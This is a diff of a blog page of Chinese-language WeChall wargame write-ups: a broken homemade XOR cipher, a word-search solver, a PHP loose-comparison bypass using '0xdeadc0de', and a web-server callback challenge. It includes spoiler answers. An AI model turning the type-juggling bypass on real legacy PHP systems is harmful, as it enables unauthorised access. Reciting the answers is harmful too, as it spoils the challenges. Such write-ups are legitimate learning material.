class="number">20</span>:])</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong><code>&lt;br/&gt;</code> 标签</strong>：页面里的超大整数被
-<code>&lt;br/&gt;</code>
-换行打断，直接复制会漏数字或引入多余字符。必须用 regex 去掉
-<code>&lt;br/&gt;</code> 后再提取连续数字串。</li>
-<li><strong>静态题</strong>：n1/n2/n3/c1/c2/c3
-是固定的，对所有用户相同。答案唯一，只需计算一次。</li>
-<li><strong><code>sympy</code>
-需要安装</strong>：<code>uv pip install sympy</code> 或
-<code>pip install sympy</code>。</li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">21987654321987654321</span></span>
+<p>源码关键逻辑:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$one</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    <span class="variable">$nine</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$number</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$number</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 禁止数字 1-9</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&quot;3735929054&quot;</span>;  <span class="comment">// loose comparison</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>数字 0 是允许的（只检查 1-9）。<code>3735929054</code> 的十六进制是
+<code>0xdeadc0de</code>，不包含 1-9。</p>
+<p>PHP 的 loose comparison (<code>==</code>) 遇到 <code>0x</code>
+前缀的字符串时，PHP 7.x 及更早版本会将其按十六进制解析为整数。所以
+<code>"0xdeadc0de" == "3735929054"</code> →
+<code>3735929054 == 3735929054</code> → <code>true</code>。</p>
+<p>这个技巧在 PHP 8.0+ 已被修复（hex string 不再被当作 numeric
+string），但 WeChall 仍运行在旧版 PHP 上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c <span class="string">&quot;print(0xdeadc0de)&quot;</span></span><br><span class="line"><span class="number">3735929054</span></span><br></pre></td></tr></table></figure>
+<p>提交入口在 <code>php0818.php</code>，POST 字段为
+<code>number</code>（不是 <code>answer</code>，也不需要 CSRF
+token）。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">0xdeadc0de</span></span>
 
       
     </div>
@@ -1080,7 +1414,7 @@ CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-gizcrypt/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-www-basics/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1098,7 +1432,7 @@ CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-gizcrypt/" class="post-title-link" itemprop="url">WeChall - GizCrypt</a>
+          <a href="/wp/WeChall/wechall-training-www-basics/" class="post-title-link" itemprop="url">WeChall - Training - WWW-Basics</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1109,14 +1443,14 @@ CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-11 14:01:53" itemprop="dateCreated datePublished" datetime="2026-06-11T14:01:53+08:00">2026-06-11</time>
+      <time title="Created: 2026-06-05 16:20:28" itemprop="dateCreated datePublished" datetime="2026-06-05T16:20:28+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 09:54:44" itemprop="dateModified" datetime="2026-09-15T09:54:44+08:00">2026-09-15</time>
+      <time title="Modified: 2026-09-15 10:08:14" itemprop="dateModified" datetime="2026-09-15T10:08:14+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1137,8 +1471,8 @@ CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-gizcrypt/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-gizcrypt/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-training-www-basics/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-www-basics/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1152,36 +1486,24 @@ CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>GizCrypt (Crypto) by gizmore 自制对称加密，GWF_Crypt 算法，key 固定为
-11 位 a-zA-Z</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>题面给出一个自制对称加密（算法源码可见），一段 hex 密文，一个 key
-的约束：长度 11，只含
-<code>a-zA-Z</code>。目标是解密密文得到可读英文文本，从中提取嵌入的 12
-位大写 HEX token 作为 answer。</p>
-<h3 id="solution">Solution</h3>
-<p>算法源码（GWF_Crypt）：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$ciphertext</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$back</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$ciphertext</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$k</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$e</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;e&#x27;</span>);          <span class="comment">// 101, 常数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$k</span> += <span class="variable">$x</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> &gt;= <span class="variable">$klen</span>) &#123;</span><br><span class="line">            <span class="variable">$k</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable">$x</span>++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$x</span> &gt;= <span class="variable">$klen</span>)  <span class="variable">$x</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$back</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$k</span> % <span class="variable">$klen</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="variable">$ciphertext</span>[<span class="variable">$i</span>]) ^ <span class="variable">$e</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$back</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>注意 <code>encrypt = decrypt</code>，加解密相同。本质是 XOR
-流密码，但 key 不是简单循环，它有一个递增步长的索引调度（step starts at
-1, increments after each full cycle）。</p>
-<p>Python 实现：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gizcrypt_decrypt</span>(<span class="params">ct, key</span>):</span><br><span class="line">    klen = <span class="built_in">len</span>(key)</span><br><span class="line">    x, k = <span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    e = <span class="number">101</span>  <span class="comment"># ord(&#x27;e&#x27;)</span></span><br><span class="line">    plain = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> ct:</span><br><span class="line">        k += x</span><br><span class="line">        <span class="keyword">if</span> k &gt;= klen:</span><br><span class="line">            k = <span class="number">0</span></span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> x &gt;= klen:</span><br><span class="line">                x = <span class="number">1</span></span><br><span class="line">        plain.append(key[k % klen] ^ b ^ e)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br></pre></td></tr></table></figure>
-<p>Key 恢复（按 key index 分组 → 评分）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters  <span class="comment"># 52 chars</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_index_seq</span>(<span class="params">length, klen=<span class="number">11</span></span>):</span><br><span class="line">    seq = []</span><br><span class="line">    x, k = <span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        k += x</span><br><span class="line">        <span class="keyword">if</span> k &gt;= klen:</span><br><span class="line">            k = <span class="number">0</span>; x += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> x &gt;= klen: x = <span class="number">1</span></span><br><span class="line">        seq.append(k % klen)</span><br><span class="line">    <span class="keyword">return</span> seq</span><br><span class="line"></span><br><span class="line">seq = key_index_seq(<span class="built_in">len</span>(ct))</span><br><span class="line">groups = &#123;i: [] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)&#125;</span><br><span class="line"><span class="keyword">for</span> i, kpos <span class="keyword">in</span> <span class="built_in">enumerate</span>(seq):</span><br><span class="line">    groups[kpos].append(ct[i])</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    best = <span class="literal">None</span></span><br><span class="line">    best_score = -<span class="number">9999</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> alphabet:</span><br><span class="line">        plain = <span class="built_in">bytes</span>(k ^ c ^ <span class="number">101</span> <span class="keyword">for</span> c <span class="keyword">in</span> groups[pos])</span><br><span class="line">        score = <span class="built_in">sum</span>(<span class="number">4</span> <span class="keyword">if</span> b <span class="keyword">in</span> (<span class="number">32</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">111</span>) <span class="keyword">else</span></span><br><span class="line">                    <span class="number">2</span> <span class="keyword">if</span> <span class="built_in">chr</span>(b).isalpha() <span class="keyword">or</span> b <span class="keyword">in</span> (<span class="number">44</span>,<span class="number">46</span>,<span class="number">39</span>) <span class="keyword">else</span></span><br><span class="line">                    <span class="number">1</span> <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">else</span> -<span class="number">10</span></span><br><span class="line">                    <span class="keyword">for</span> b <span class="keyword">in</span> plain)</span><br><span class="line">        <span class="keyword">if</span> score &gt; best_score:</span><br><span class="line">            best_score = score</span><br><span class="line">            best = k</span><br><span class="line">    key.append(best)</span><br><span class="line"></span><br><span class="line">full_key = <span class="string">&#x27;&#x27;</span>.join(key)  <span class="comment"># ItsPassword</span></span><br><span class="line">plain = gizcrypt_decrypt(ct, full_key.encode())</span><br><span class="line"><span class="built_in">print</span>(plain.decode())     <span class="comment"># 包含 answer: 9DD4752982DC</span></span><br></pre></td></tr></table></figure>
-<p>关键发现：</p>
+          <h3 id="challenge">Challenge</h3>
+<p>在本机或公网服务器搭建 HTTP
+服务器，从外部可访问，提供指定路径和内容的文件。WeChall
+会从你登录时的来源 IP 发起回调验证。</p>
+<p>挑战页面会给出具体的参数（每个 session 不同）：</p>
 <ul>
-<li><strong>Key
-是固定的</strong>：<code>ItsPassword</code>，对所有人所有 session
-都相同。只需要对当前 session 的密文解密即可得到唯一的 answer。</li>
-<li><strong>Answer 是
-session-bound</strong>：每次页面刷新密文变化，嵌入的 12 位 HEX token
-也变化，必须用当前 session 的密文解密。</li>
-<li><strong>评分时 key[1] 样本太少</strong>（仅有 ~6 个字节），所以
-key[1] 置信度最低。可以结合英文上下文人工校正。</li>
+<li>URL 路径:
+<code>http://&lt;IP&gt;:&lt;port&gt;/&lt;USER&gt;/&lt;USER&gt;.html</code></li>
+<li>文件内容:
+<code>My name is &lt;USER&gt; and iChall.</code>（精确字节数）</li>
+<li>字节数要求精确，不能多换行符</li>
 </ul>
+<h3 id="solution">Solution</h3>
+<p>核心问题: WeChall 根据登录时的来源 IP 发起回调验证。如果机器位于
+NAT/VPN 之后且没有公网 IP，则无法直接验证。</p>
+<p>解决方案: 在一台有公网 IP 的服务器上（VPS）搭建 Web
+服务，从该服务器登录 WeChall 并提交。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 在公网服务器上创建文件（USER 替换为 challenge 页面给你的值）</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/&lt;USER&gt;</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;My name is &lt;USER&gt; and iChall.&#x27;</span> &gt; /tmp/&lt;USER&gt;/&lt;USER&gt;.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 启动 HTTP 服务器</span></span><br><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; python3 -m http.server &lt;PORT&gt; &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 用 Python 从服务器登录 WeChall 并提交端口</span></span><br><span class="line">python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">import urllib.request, urllib.parse, http.cookiejar</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cj = http.cookiejar.MozillaCookieJar()</span></span><br><span class="line"><span class="string">opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))</span></span><br><span class="line"><span class="string">opener.addheaders = [(&#x27;User-Agent&#x27;, &#x27;Mozilla/5.0&#x27;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Login (填入自己的 WeChall 账号)</span></span><br><span class="line"><span class="string">opener.open(&#x27;https://www.wechall.net/en/login&#x27;, timeout=30)</span></span><br><span class="line"><span class="string">data = urllib.parse.urlencode(&#123;&#x27;username&#x27;:&#x27;&lt;WC_USER&gt;&#x27;,&#x27;password&#x27;:&#x27;&lt;WC_PASS&gt;&#x27;,&#x27;login&#x27;:&#x27;Login&#x27;&#125;).encode()</span></span><br><span class="line"><span class="string">opener.open(urllib.request.Request(&#x27;https://www.wechall.net/en/login&#x27;, data=data), timeout=30)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Submit port</span></span><br><span class="line"><span class="string">data = urllib.parse.urlencode(&#123;&#x27;port&#x27;:&#x27;&lt;PORT&gt;&#x27;,&#x27;go&#x27;:&#x27;I have set it up. Please check my server.&#x27;&#125;).encode()</span></span><br><span class="line"><span class="string">opener.open(urllib.request.Request(&#x27;https://www.wechall.net/en/challenge/training/www/basic/index.php&#x27;, data=data), timeout=30)</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1208,7 +1530,7 @@ key[1] 置信度最低。可以结合英文上下文人工校正。</li>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-lettergrid/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-zebra/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1226,7 +1548,7 @@ key[1] 置信度最低。可以结合英文上下文人工校正。</li>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-lettergrid/" class="post-title-link" itemprop="url">WeChall - Lettergrid</a>
+          <a href="/wp/WeChall/wechall-zebra/" class="post-title-link" itemprop="url">WeChall - Zebra</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1237,14 +1559,14 @@ key[1] 置信度最低。可以结合英文上下文人工校正。</li>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-11 14:01:53" itemprop="dateCreated datePublished" datetime="2026-06-11T14:01:53+08:00">2026-06-11</time>
+      <time title="Created: 2026-06-05 11:50:00" itemprop="dateCreated datePublished" datetime="2026-06-05T11:50:00+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 09:55:04" itemprop="dateModified" datetime="2026-09-15T09:55:04+08:00">2026-09-15</time>
+      <time title="Modified: 2026-09-15 10:33:37" itemprop="dateModified" datetime="2026-09-15T10:33:37+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1265,8 +1587,8 @@ key[1] 置信度最低。可以结合英文上下文人工校正。</li>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-lettergrid/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-lettergrid/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-zebra/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-zebra/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1280,292 +1602,23 @@ key[1] 置信度最低。可以结合英文上下文人工校正。</li>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Lettergrid (Coding) by gizmore 限时 word search：4.5
-秒内找出网格中所有隐藏单词并按起始位置提交</p>
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Help! A zebra escaped from its enclosure. But where is it now?</p>
 </blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>页面生成一个字母网格，需要在 4.5 秒内找出所有隐藏的单词（长度 &gt;=
-6，8 个直线方向），并按起始字母位置排序后提交。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Base:      https://www.wechall.net/challenge/lettergrid</span><br><span class="line">Grid:      generate.php   → 返回 &lt;pre&gt; 格式的字母网格</span><br><span class="line">Submit:    index.php?solution=&lt;answer&gt;&amp;cmd=Submit+Answer  (GET)</span><br></pre></td></tr></table></figure>
-<p>答案格式：单词<strong>直接拼接，无分隔符</strong>（不是逗号分隔）。按单词起始位置（从上到下、从左到右）排序。</p>
+<p>一张 PNG
+图片（斑马），斑马身上的条纹实际上是一个一维条码（barcode），但条码的条纹"越狱"了，bars
+没有延伸到应有的边界。</p>
 <h3 id="solution">Solution</h3>
-<p>Trie 前缀树 + 8 方向扫描，单次运行 2-3 秒，远低于 4.5s 限时：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&#x27;https://www.wechall.net/challenge/lettergrid&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.cookies.<span class="built_in">set</span>(<span class="string">&#x27;WC&#x27;</span>, <span class="string">&#x27;...&#x27;</span>, domain=<span class="string">&#x27;www.wechall.net&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 构建 Trie（单词 &gt;= 6 字符）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrieNode</span>:</span><br><span class="line">    __slots__ = (<span class="string">&#x27;children&#x27;</span>, <span class="string">&#x27;is_word&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.children = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.is_word = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">root = TrieNode()</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/share/dict/words&#x27;</span>):</span><br><span class="line">    w = word.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(w) &gt;= <span class="number">6</span>:</span><br><span class="line">        node = root</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> w:</span><br><span class="line">            node = node.children.setdefault(ch, TrieNode())</span><br><span class="line">        node.is_word = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 获取网格</span></span><br><span class="line">r = sess.get(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/generate.php&#x27;</span>)</span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;&lt;pre&gt;(.*?)&lt;/pre&gt;&#x27;</span>, r.text, re.DOTALL)</span><br><span class="line">grid = [<span class="built_in">list</span>(line.strip().lower()) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="keyword">match</span>.group(<span class="number">1</span>).strip().split(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">if</span> line.strip()]</span><br><span class="line">ROWS, COLS = <span class="built_in">len</span>(grid), <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 8 方向搜索（用 Trie 实时剪枝）</span></span><br><span class="line">DIRS = [(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">0</span>,-<span class="number">1</span>),(<span class="number">1</span>,<span class="number">0</span>),(-<span class="number">1</span>,<span class="number">0</span>),(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">1</span>,-<span class="number">1</span>),(-<span class="number">1</span>,<span class="number">1</span>),(-<span class="number">1</span>,-<span class="number">1</span>)]</span><br><span class="line">found = &#123;&#125;  <span class="comment"># word -&gt; (start_r, start_c)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(ROWS):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(COLS):</span><br><span class="line">        <span class="keyword">for</span> dr, dc <span class="keyword">in</span> DIRS:</span><br><span class="line">            node, last_word, last_len = root, <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(ROWS, COLS)):</span><br><span class="line">                nr, nc = r + dr*step, c + dc*step</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= nr &lt; ROWS <span class="keyword">and</span> <span class="number">0</span> &lt;= nc &lt; COLS): <span class="keyword">break</span></span><br><span class="line">                ch = grid[nr][nc]</span><br><span class="line">                <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> node.children: <span class="keyword">break</span></span><br><span class="line">                node = node.children[ch]</span><br><span class="line">                <span class="keyword">if</span> node.is_word:</span><br><span class="line">                    word = <span class="string">&#x27;&#x27;</span>.join(grid[r+dr*s][c+dc*s] <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(step+<span class="number">1</span>))</span><br><span class="line">                    <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> found:</span><br><span class="line">                        found[word] = (r, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 按起始位置排序后提交</span></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(found.keys(), key=<span class="keyword">lambda</span> w: found[w]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Found <span class="subst">&#123;<span class="built_in">len</span>(found)&#125;</span> words: <span class="subst">&#123;<span class="built_in">sorted</span>(found.keys())&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = sess.get(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/index.php&#x27;</span>, params=&#123;<span class="string">&#x27;solution&#x27;</span>: answer, <span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;Submit Answer&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;solved&#x27;</span> <span class="keyword">in</span> r.text.lower() <span class="keyword">or</span> <span class="string">&#x27;correct&#x27;</span> <span class="keyword">in</span> r.text.lower():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;SOLVED!&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>Key Points:</p>
-<ul>
-<li><strong>无分隔符</strong>：单词按起始位置排序后直接拼接，不加逗号或空格</li>
-<li><strong><code>/challenge/lettergrid/</code></strong>：注意 URL 没有
-<code>/en/</code> 前缀</li>
